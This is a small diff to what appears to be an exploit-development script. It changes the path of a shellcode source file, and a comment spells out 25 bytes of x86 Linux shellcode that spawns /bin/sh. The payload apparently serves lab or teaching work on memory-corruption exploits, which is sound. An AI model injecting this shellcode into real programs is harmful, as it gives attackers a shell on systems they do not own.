@@ -54,7 +54,7 @@ main() {
 
     # Payload(s)
 
-    shellcode="$(generate_shellcode './data/shellcode.asm')"; # \061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
+    shellcode="$(generate_shellcode "$CURR_DIR_PATH/data/shellcode.asm")"; # \061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
     shellcode_length="$(printf '%b' "$shellcode" | wc -c)"; # 25
 
     if [ "$shellcode_length" -ne "25" ]; then
